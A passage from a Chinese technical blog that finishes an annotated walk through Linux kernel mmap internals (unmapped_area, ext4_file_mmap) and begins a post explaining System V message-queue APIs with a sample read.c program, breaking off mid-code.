class="line"></span><br><span class="line">	info.flags = <span class="number">0</span>;</span><br><span class="line">	info.low_limit = mm-&gt;mmap_base;</span><br><span class="line">	info.high_limit = TASK_SIZE;</span><br><span class="line">	<span class="keyword">return</span> vm_unmapped_area(&amp;info); <span class="comment">/* 根据vm_unmapped_area_info扫描mmap映射区域来查找满足请求的内存 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>vm_unmapped_area</code> 用于在 mmap 映射区域中查找满足请求的内存（以 <code>vm_area_struct</code> 为单位），这是内存分配中最底层的内容</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 搜索未映射的地址范围,条件如下:</span></span><br><span class="line"><span class="comment"> * - 不与任何VMA相交</span></span><br><span class="line"><span class="comment"> * - 区间范围属于 [low_limit,high_limit)</span></span><br><span class="line"><span class="comment"> * - 地址大小至少是 length</span></span><br><span class="line"><span class="comment"> * - 满足 (begin_addr &amp; align_mask) == (align_offset &amp; align_mask)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">vm_unmapped_area</span><span class="params">(struct vm_unmapped_area_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (info-&gt;flags &amp; VM_UNMAPPED_AREA_TOPDOWN) <span class="comment">/* VM_UNMAPPED_AREA_TOPDOWN:将虚拟机未映射区域自上而下进行映射(在本调用链中恒不成立) */</span></span><br><span class="line">		<span class="keyword">return</span> unmapped_area_topdown(info); <span class="comment">/* 反向 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> unmapped_area(info); <span class="comment">/* 正向 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>看来 mmap 还支持反向映射，我们这里主要研究正向映射 <code>unmapped_area</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">unmapped_area</span><span class="params">(struct vm_unmapped_area_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 我们通过寻找紧跟合适间隙的rbtree节点来实现搜索</span></span><br><span class="line"><span class="comment">	 * - gap_start = vma-&gt;vm_prev-&gt;vm_end &lt;= info-&gt;high_limit - length;</span></span><br><span class="line"><span class="comment">	 * - gap_end   = vma-&gt;vm_start        &gt;= info-&gt;low_limit  + length;</span></span><br><span class="line"><span class="comment">	 * - gap_end - gap_start &gt;= length</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> length, low_limit, high_limit, gap_start, gap_end;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust search length to account for worst case alignment overhead */</span></span><br><span class="line">	length = info-&gt;length + info-&gt;align_mask;</span><br><span class="line">	<span class="keyword">if</span> (length &lt; info-&gt;length)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust search limits by the desired length */</span></span><br><span class="line">	<span class="keyword">if</span> (info-&gt;high_limit &lt; length)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	high_limit = info-&gt;high_limit - length;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (info-&gt;low_limit &gt; high_limit)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	low_limit = info-&gt;low_limit + length;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check if rbtree root looks promising */</span></span><br><span class="line">	<span class="keyword">if</span> (RB_EMPTY_ROOT(&amp;mm-&gt;mm_rb))</span><br><span class="line">		<span class="keyword">goto</span> check_highest;</span><br><span class="line">	vma = rb_entry(mm-&gt;mm_rb.rb_node, struct vm_area_struct, vm_rb);</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;rb_subtree_gap &lt; length)</span><br><span class="line">		<span class="keyword">goto</span> check_highest;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="comment">/* Visit left subtree if it looks promising */</span></span><br><span class="line">		gap_end = vm_start_gap(vma);</span><br><span class="line">		<span class="keyword">if</span> (gap_end &gt;= low_limit &amp;&amp; vma-&gt;vm_rb.rb_left) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">left</span> =</span></span><br><span class="line">				rb_entry(vma-&gt;vm_rb.rb_left,</span><br><span class="line">					 struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (left-&gt;rb_subtree_gap &gt;= length) &#123;</span><br><span class="line">				vma = left;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		gap_start = vma-&gt;vm_prev ? vm_end_gap(vma-&gt;vm_prev) : <span class="number">0</span>;</span><br><span class="line">check_current:</span><br><span class="line">		<span class="comment">/* Check if current node has a suitable gap */</span></span><br><span class="line">		<span class="keyword">if</span> (gap_start &gt; high_limit)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (gap_end &gt;= low_limit &amp;&amp;</span><br><span class="line">		    gap_end &gt; gap_start &amp;&amp; gap_end - gap_start &gt;= length)</span><br><span class="line">			<span class="keyword">goto</span> found;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Visit right subtree if it looks promising */</span></span><br><span class="line">		<span class="keyword">if</span> (vma-&gt;vm_rb.rb_right) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">right</span> =</span></span><br><span class="line">				rb_entry(vma-&gt;vm_rb.rb_right,</span><br><span class="line">					 struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (right-&gt;rb_subtree_gap &gt;= length) &#123;</span><br><span class="line">				vma = right;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Go back up the rbtree to find next candidate node */</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">prev</span> =</span> &amp;vma-&gt;vm_rb;</span><br><span class="line">			<span class="keyword">if</span> (!rb_parent(prev))</span><br><span class="line">				<span class="keyword">goto</span> check_highest;</span><br><span class="line">			vma = rb_entry(rb_parent(prev),</span><br><span class="line">				       struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (prev == vma-&gt;vm_rb.rb_left) &#123;</span><br><span class="line">				gap_start = vm_end_gap(vma-&gt;vm_prev);</span><br><span class="line">				gap_end = vm_start_gap(vma);</span><br><span class="line">				<span class="keyword">goto</span> check_current;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">check_highest:</span><br><span class="line">	<span class="comment">/* Check highest gap, which does not precede any rbtree node */</span></span><br><span class="line">	gap_start = mm-&gt;highest_vm_end;</span><br><span class="line">	gap_end = ULONG_MAX;  <span class="comment">/* Only for VM_BUG_ON below */</span></span><br><span class="line">	<span class="keyword">if</span> (gap_start &gt; high_limit)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">	<span class="comment">/* We found a suitable gap. Clip it with the original low_limit. */</span></span><br><span class="line">	<span class="keyword">if</span> (gap_start &lt; info-&gt;low_limit)</span><br><span class="line">		gap_start = info-&gt;low_limit;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust gap address to the desired alignment */</span></span><br><span class="line">	gap_start += (info-&gt;align_offset - gap_start) &amp; info-&gt;align_mask;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(gap_start + info-&gt;length &gt; info-&gt;high_limit);</span><br><span class="line">	VM_BUG_ON(gap_start + info-&gt;length &gt; gap_end);</span><br><span class="line">	<span class="keyword">return</span> gap_start; <span class="comment">/* 最后返回找到的addr */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>最底层的查找过程是用 <strong>红黑树</strong> 实现的（由于本人对红黑树还不是很了解，这里就先跳过了）</li>
<li>至于 mmap 映射区域的由来，这就是分页机制和内容了</li>
<li>最后返回到之前的函数中，mmap 也设置了两种机制：共享和私有<ul>
<li>如果是共享映射，那么在内存中对文件进行修改，磁盘中对应的文件也会被修改，相反，磁盘中的文件有了修改，内存中的文件也被修改</li>
<li>如果是私有映射，那么内存中的文件是独立的，二者进行修改都不会对对方造成影响</li>
</ul>
</li>
<li>不管是调用 <code>do_mmap_shared_file</code> 或者 <code>do_mmap_private</code>，他们底层都会调用 <code>call_mmap</code> 完成最后的设置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">call_mmap</span><span class="params">(struct file *file, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> file-&gt;f_op-&gt;mmap(file, vma);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Ext4 文件系统中 <code>file-&gt;f_op-&gt;mmap</code> 指向 <code>ext4_file_mmap</code>（Linux 默认的文件系统为 Ext2 Ext3 Ext4）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_file_mmap</span><span class="params">(struct file *file, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file-&gt;f_mapping-&gt;host;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">		<span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t support synchronous mappings for non-DAX files. At least</span></span><br><span class="line"><span class="comment">	 * until someone comes with a sensible use case.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_DAX(file_inode(file)) &amp;&amp; (vma-&gt;vm_flags &amp; VM_SYNC))</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	file_accessed(file);</span><br><span class="line">	<span class="keyword">if</span> (IS_DAX(file_inode(file))) &#123;</span><br><span class="line">		vma-&gt;vm_ops = &amp;ext4_dax_vm_ops; <span class="comment">/* 初始化vma-&gt;vm_ops(在page fault handler中被使用到) */</span></span><br><span class="line">		vma-&gt;vm_flags |= VM_HUGEPAGE;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		vma-&gt;vm_ops = &amp;ext4_file_vm_ops;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当所有的剩余工作都处理完成后，mmap 就会返回在 mmap 映射区找到的 addr</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：msg底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-19 20:58:41 / Modified: 21:00:34" itemprop="dateCreated datePublished" datetime="2022-09-19T20:58:41+08:00">2022-09-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>msg 简述</strong></p>
<p>消息队列，是消息的链接表，存放在内核中，一个消息队列由一个标识符（即ID）来标识</p>
<ul>
<li>消息队列的标识符 key 键，它的基本类型是 key_t，使用 <code>ftok</code> 函数可以生成一个 key_t</li>
<li>两个无关的进程，可以通过唯一标识符 key 来找到对应的 msg</li>
</ul>
<img src="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663569472621.png" class width="1663569472621"> 
<p>共享内存，消息队列，信号量它们三个都是找一个中间介质来进行通信的，就是文件的设备编号和节点，<code>ftok()</code> 就可以通过“文件路径”来获取一个 key_t 键值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 系统IPC键值的格式转换函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">key_t</span> <span class="title">ftok</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fname, <span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>fname：<ul>
<li>指定的文件名，这个文件必须是存在的而且可以访问的</li>
<li>只是根据文件 inode 在系统内的唯一性来取一个数值，和文件的权限无关 </li>
</ul>
</li>
<li>id：<ul>
<li>子序号，它是一个8bit的整数，即范围是0~255 </li>
<li>可以根据自己的约定，随意设置</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 key_t 键值 </li>
<li>出错：返回 “-1”</li>
</ul>
</li>
</ul>
<p><strong>msg API</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建或打开消息队列:成功返回队列ID,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>; </span><br></pre></td></tr></table></figure>
<ul>
<li>key：<ul>
<li>IPC_PRIVATE - “0”：会建立新的消息队列（只能单进程通信，不能在两个进程之间进行通信）</li>
<li>大于0的32位整数：视参数 msgflg 来确定操作，通常要求此值来源于 ftok 返回的 IPC 键值</li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：取消息队列标识符，若不存在则函数会报错</li>
<li>IPC_CREAT：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列，返回此消息队列的标识符 </li>
<li>IPC_CREAT | IPC_EXCL：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列则报错 </li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回消息队列的标识符 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 添加消息:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>msgp：<ul>
<li>发送给队列的消息</li>
<li>msgp 可以是任何类型的结构体，但第一个字段必须为 long 类型，即表明此发送消息的类型</li>
</ul>
</li>
<li>msgsz：<ul>
<li>要发送消息的大小（不含消息类型占用的4个字节）</li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：当消息队列满时，msgsnd 将会阻塞，直到消息能写进消息队列</li>
<li>IPC_NOWAIT：当消息队列已满的时候，msgsnd 函数不等待立即返回</li>
<li>MSG_NOERROR：若发送的消息大于 size 字节，则把该消息截断，截断部分将被丢弃，且不通知发送进程</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 “0” </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读取消息:成功返回消息数据的长度,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>msgp：<ul>
<li>存放消息的结构体</li>
<li>结构体类型要与 msgsnd 函数发送的类型相同</li>
</ul>
</li>
<li>msgsz：<ul>
<li>要接收消息的大小（不含消息类型占用的4个字节）</li>
</ul>
</li>
<li>msgtyp：<ul>
<li>“0”：接收第一个消息 </li>
<li>大于零：接收类型等于 msgtyp 的第一个消息 </li>
<li>小于零：接收类型等于或者小于 msgtyp 绝对值的第一个消息 </li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：阻塞式接收消息，没有该类型的消息 msgrcv 函数一直阻塞等待</li>
<li>IPC_NOWAIT：如果没有符合条件的 msg 则立即返回“-1”，此时错误码为 ENOMSG </li>
<li>MSG_COPY：内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>MSG_EXCEPT：返回队列中第一个类型不为 msgtype 的消息 </li>
<li>MSG_NOERROR：如果队列中满足条件的消息内容大于所请求的 size 字节，则把该消息截断，截断部分将被丢弃</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 “0” </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 控制消息队列:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>cmd：<ul>
<li>IPC_STAT：获得 msgid 的消息队列头数据到 buf 中</li>
<li>IPC_SET：设置消息队列的属性，要设置的属性需先存储在 buf 中，可设置的属性包括：<ul>
<li>msg_perm.uid、msg_perm.gid、msg_perm.mode 以及 msg_qbytes </li>
</ul>
</li>
</ul>
</li>
<li>return：<ul>
<li>成功：“0” </li>
<li>出错：“-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<p><strong>msg 使用案例</strong></p>
<p>read.c 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">999</span>,<span class="string">&quot;888 message already received&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">888</span>,<span class="number">0</span>);<span class="comment">//从队列中获取888类型的数据，如果队列中未出现888类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read from que:%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为999)数据</span></span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>send.c 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">888</span>,<span 